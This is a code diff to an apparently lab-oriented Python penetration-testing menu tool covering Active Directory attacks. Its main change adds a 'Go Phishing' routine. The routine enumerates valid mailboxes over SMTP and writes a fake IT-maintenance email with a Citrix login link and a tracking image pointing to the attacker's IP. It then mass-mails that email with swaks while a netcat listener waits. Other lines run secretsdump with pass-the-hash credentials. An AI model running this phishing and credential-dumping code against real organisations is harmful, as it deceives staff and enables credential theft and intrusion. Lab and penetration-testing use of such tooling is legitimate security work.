@@ -29,6 +29,7 @@ colour1 = 'yellow'
 colour2 = 'green'
 colour3 = 'white'
 colour4 = 'red'
+colour5 = 'blue'
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -41,8 +42,21 @@ colour4 = 'red'
 if os.geteuid() != 0:
     print("\n[*] Please run this python3 script as root...")
     exit(True)
+    
+# -------------------------------------------------------------------------------------
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub                                                               
+# Version : COVID-3                                                                
+# Details : Local variable settings - These can be altered by the user.
+# Modified: N/A                                                               
+# -------------------------------------------------------------------------------------
 
-BUG = 0				# BUGHUNT ON/OFF
+BUG = 0									# SET BUGHUNT ON/OFF HERE
+
+os.system("ip a s tun0 | awk '/inet/ {print $2}' > localip.tmp")	# SET LOCAL NETWORK HERE
+localip = linecache.getline("localip.tmp",1)
+localip = localip.rstrip("\n")
+localip,null = localip.split("/")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -294,7 +308,7 @@ def options():
    print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set WORK AREA   (22) Service (32) Lookup Sids    (42) KerbBruteForce (52) BloodHound  (62) GenListPASS (72) MSF Tomcat (82) SSH ID  " + '\u2551')
    print('\u2551' + "(3) Re/Set LIVE PORTS  (13) Check Connection   (23) AtExec  (33) SamDump Users  (43) KerbRoasting   (53) BH ACLPwn   (63) Editor USER (73) RemoteSync (83) Telnet  " + '\u2551')
    print('\u2551' + "(4) Re/Set WEB ADDRESS (14) Recon DNS SERVER   (24) DcomExe (34) REGistryValues (44) KerbASREPRoast (54) SecretsDump (64) Editor PASS (74) RSyncDumpS (84) NetCat  " + '\u2551')
-   print('\u2551' + "(5) Re/Set USER NAME   (15) Dump DNS SERVER    (25) PsExec  (35) Rpc Dump       (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HOST (75) MailForcer (85) SQSH    " + '\u2551')
+   print('\u2551' + "(5) Re/Set USER NAME   (15) Dump DNS SERVER    (25) PsExec  (35) Rpc Dump       (45) PASSWORD2HASH  (55) CrackMapExe (65) Editor HOST (75) GoPhishing (85) SQSH    " + '\u2551')
    print('\u2551' + "(6) Re/Set PASS WORD   (16) NMap LIVE PORTS    (26) SmbExec (36) Rpc Client     (46) Pass the HASH  (56) PSExec HASH (66) Editor DNS  (76) Nikto Scan (86) MSSQL   " + '\u2551')
    print('\u2551' + "(7) Re/Set NTLM HASH   (17) NMap PORT Services (27) WmiExec (37) Smb Client     (47) PasstheTicket  (57) SmbExecHASH (67) Hydra FTP   (77) GoBuster   (87) MySQL   " + '\u2551')
    print('\u2551' + "(8) Re/Set DOMAIN NAME (18) NMap SubDOMAINS    (28) IfMap   (38) SmbMap SHARE   (48) Silver Ticket  (58) WmiExecHASH (68) Hydra SSH   (78) RDeskTop   (88) WinRm   " + '\u2551')
@@ -328,6 +342,7 @@ print("       BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)       ")
 # -------------------------------------------------------------------------------------
 
 print("\n[*] Booting - Please wait...\n")
+print("[+] Local host set to " + localip + "...")
 if not os.path.exists("LOCAL_FOLDER"):
    os.mkdir("LOCAL_FOLDER")
    print("[+] Work area created...")
@@ -405,7 +420,7 @@ else:
    SID = linecache.getline('config.txt', 9).rstrip("\n")
    TSH = linecache.getline('config.txt', 10).rstrip("\n")
    LTM = linecache.getline('config.txt', 11).rstrip("\n")
-   DIR = linecache.getline('config.txt', 12).rstrip("\n")
+   DIR = linecache.getline('config.txt', 12).rstrip("\n")   
 
 if len(DNS) < COL1: DNS = padding(DNS, COL1)
 if len(TIP) < COL1: TIP = padding(TIP, COL1)
@@ -420,6 +435,10 @@ if len(TSH) < COL1: TSH = padding(TSH, COL1)
 if len(LTM) < COL1: LTM = padding(LTM, COL1)
 if len(DIR) < COL1: DIR = padding(DIR, COL1)
 
+if DOM[:5] != "EMPTY":
+   command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
+   DOMC = 1
+
 time.sleep( 5 ) # Splash Screen
 
 # -------------------------------------------------------------------------------------
@@ -431,6 +450,7 @@ time.sleep( 5 ) # Splash Screen
 # -------------------------------------------------------------------------------------
 
 while True: 
+   command("rm *.tmp")
    command("clear")
    linecache.clearcache()
    LTM = gettime(COL1)
@@ -475,7 +495,7 @@ while True:
            print("[-] Unable to enumerate domain name...")
          else:
             print("[+] Found domain...\n")
-            print(colored(DOM,colour2, attrs=['bold']))
+            print(colored(DOM,colour2))
             
             if DOMC == 1:
                print("\n[*] Resetting current domain association...")
@@ -504,7 +524,7 @@ while True:
             print("[-] Unable to enumerate domain SID...")
          else:
             print("[+] Found SID...\n")
-            print(colored(SID,colour2, attrs=['bold']) + "\n")
+            print(colored(SID,colour2) + "\n")
                  
 # ------------------------------------------------------------------------------------- 
           
@@ -531,7 +551,7 @@ while True:
                      null, SHAR[x] = SHAR[x].split(":")
                   except ValueError:
                      SHAR[x] = "Error..."
-                  print(colored(SHAR[x].rstrip("\n"),colour2, attrs=['bold']))
+                  print(colored(SHAR[x].rstrip("\n"),colour2))
                   if len(SHAR[x]) < COL2: SHAR[x] = dpadding(SHAR[x], COL2)
                print("")
                   
@@ -564,7 +584,7 @@ while True:
                   USER[x] = USER[x].replace("]","")
                   USER[x] = USER[x].replace("rid","")
                   if USER[x][:5] != "Error":
-                     print(colored(USER[x],colour2, attrs=['bold']))
+                     print(colored(USER[x],colour2))
                   if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
                   command("echo " + USER[x] + " >> usernames.txt")
       
@@ -933,7 +953,7 @@ while True:
             print("[-] Unable to enumerate any port information, good luck!!...")
          else:
             print("[+] Found live ports...\n")
-            print(colored(POR,colour2, attrs=['bold']))         
+            print(colored(POR,colour2))         
         
          prompt()
       
@@ -1015,7 +1035,7 @@ while True:
                if "is" in line:
                   OS = line
                   print("[+] Found architecture...")
-         print(colored("\n" + OS,colour2, attrs=['bold']))
+         print(colored("\n" + OS,colour2))
          command("rm os.txt")
       prompt()
 
@@ -1368,7 +1388,7 @@ while True:
                USER[x] = USER[x][0]
                USER[x] = padding(USER[x], COL3)
                if USER[x] != "":
-                  print(colored(USER[x],colour2, attrs=['bold']))
+                  print(colored(USER[x],colour2))
 
                   command("echo " + USER[x] + " >> usernames.txt")	# ASSIGN USERS NAME
                else:
@@ -2009,7 +2029,7 @@ while True:
          else:
             command(PATH + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes ':" + NTM.rstrip(" ") + "' > SECRETS.tmp")
 
-         command("sed -i '/:::/!d' SECRETS.tmp")				# TIDY UP FILE READY FOR READING
+         command("sed -i '/:::/!d' SECRETS.tmp")			# TIDY UP FILE READY FOR READING
          count = len(open('SECRETS.tmp').readlines())
 
          cleanusers()         
@@ -2038,7 +2058,7 @@ while True:
             get3 = get1.rstrip("\n")
             get4 = get4.rstrip("\n")
 
-            print(colored("[+] Found User " + get1,colour2, attrs=['bold']))
+            print(colored("[+] Found User " + get1,colour2))
             USER[x] = get1[:COL3]
             USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")		# STRIP ANY REMAINING DOMAIN NAME
             PASS[x] = get4[:COL4]         
@@ -2600,7 +2620,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : COVID-3
-# Details : Menu option selected - swaks experimental!!
+# Details : Menu option selected - Mr Phiser is experimental!!
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -2611,48 +2631,73 @@ while True:
          print("[-] Remote IP address has not been specified...")
          CheckParams = 1
          
-      if TIP[:5] == "EMPTY":
-         print("[-] Remote Domain serevr has not been specified...")
+      if DOM[:5] == "EMPTY":
+         print("[-] Remote mail.server has not been specified...")
          CheckParams = 1
          
       if CheckParams != 1:
-         command("ip a s tun0 | awk '/inet/ {print $2}' > ip.tmp")	# tun0 = HTB
-         localip = linecache.getline("ip.tmp",1)
-         localip = localip.rstrip("\n")
-         localip,null = localip.split("/")
          command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'MailForce'; xdotool key Return; sleep 2")
+         command("xdotool key Alt+Shift+S; xdotool type 'Go Phishing'; xdotool key Return; sleep 2")
          command("xdotool type 'nc -nvlp 80'; xdotool key Return")
          command("xdotool key Ctrl+Shift+Tab")
-         
-         phiser = "it@" + DOM.rstrip(" ")       
                  
          command('echo "Hello.\n" > body.txt')
-         command('echo " We just performed manitenance on our servers." >> body.txt')
-         command('echo " Please verify if you can still access the login page:\n" >> body.txt')
-         command('echo " Citrix http://"' + localip + '"/" >> body.txt')
-         link = ' <a href=\"http://' + localip + '\">click me.</a>'
-         command("echo '" + link + "' >> body.txt")
-         command('echo " <img src=\""' + localip + '"/img\">" >> body.txt')
+         command('echo "We just performed maintenance on our servers." >> body.txt')
+         command('echo "Please verify if you can still access the login page:\n" >> body.txt')
+         command('echo "\t  <img src=\""' + localip + '"/img\">" >> body.txt')
+         command('echo "\t  Citrix http://"' + localip + '"/" >> body.txt')
+         command('echo "  <a href=\"http://"' + localip + '"\">click me.</a>" >> body.txt')
+
          command('echo "\nRegards," >> body.txt')
-         command('echo ""' + phiser + '""  >> body.txt')
+         command('echo "it@"' + DOM.rstrip(" ") + '""  >> body.txt')
          
          print("[*] Created phishing email...\n")
-         print(colored("Subject: Credentials / Errors\n", colour2))
+         print(colored("Subject: Credentials/Errors\n", colour5))
          
          with open("body.txt", "r") as list:
             for phish in list:
                phish = phish.rstrip("\n")
-               print(colored(phish,colour2))
+               print(colored(phish,colour5))
             print("")
-                 
-         with open("usernames.txt", "r") as list:
-            for phish in list:
-               phish = phish.rstrip("\n")
-               phish = phish + "@"
-               phish = phish + DOM.rstrip(" ")
-               command("swaks --to " + phish + " --from " + phiser + " --header 'Subject: Credentials / Errors' --server " + TIP.rstrip(" ") + " --port 25 --body @body.txt > log.txt")
-               print("[+] Mail sent to " + phish + "...")
+            
+         print("[*] Checking for valid usernames...")
+         command("smtp-user-enum -U usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
+         command("tr -cd '\11\12\15\40-\176' < valid1.tmp > valid.tmp")
+         
+         match = 0         
+         with open("valid.tmp", "r") as list:			# CLEAN FILE
+            for line in list:
+               line.encode('ascii',errors='ignore')
+               line = line.rstrip("\n")
+               line = line.replace('[92m','')
+               line = line.replace('[00m','')
+               line = line.replace('[SUCC] ', '')
+               line = line.replace('250 OK', '')
+               line = line.replace('...', '')
+               line = line.replace(' ','')
+               if "TEST" not in line:                  
+                  command("echo " + line + " >> phish.tmp")
+                  match = 1
+                  
+         if match == 1:						# SHOW FOUND PHISH
+             print("[+] Found valid email addresses...\n")
+             with open("phish.tmp", "r") as list:
+                for line in list:
+                   line = line.rstrip("\n")
+                   print(colored(line + "@" + DOM.rstrip(" "),colour2))
+                           
+         if match == 1:
+            print("\n[*] Phishing the list...")			# GO PHISHING
+            with open("phish.tmp", "r") as list:
+               for phish in list:
+                  phish = phish.rstrip("\n")
+                  phish = phish.strip(" ")
+                  phish = phish + "@"
+                  phish = phish + DOM.rstrip(" ")
+                  command("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Credentials / Errors' --server " + TIP.rstrip(" ") + " --port 25 --body @body.txt > log.tmp")
+                  print("[+] Mail sent to " + phish + "...")
+         else:
+            print("[-] No valid email addresses where found...")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -2894,7 +2939,6 @@ while True:
       
       if os.path.exists("PORTS.tmp"):
          os.remove("PORTS.tmp")
-      
 #      if os.path.exists("usernames.txt"):
 #         os.remove("usernames.txt")      
 #      if os.path.exists("passwords.txt"):
@@ -2904,10 +2948,10 @@ while True:
 #      if os.path.exists("id_rsa.pub"):
 #         os.remove("id_rsa.pub")
 #         os.remove("id_rsa")
-#      if DOMC == 1:
-#         command("sed -i '$d' /etc/hosts")
-#      if len(os.listdir(DIR.rstrip(" "))) == 0:
-#         os.rmdir(DIR.rstrip(" "))
+      if DOMC == 1:
+         command("sed -i '$d' /etc/hosts")
+      if len(os.listdir(DIR.rstrip(" "))) == 0:
+         os.rmdir(DIR.rstrip(" "))
       exit(1)
 
 # Eof...	
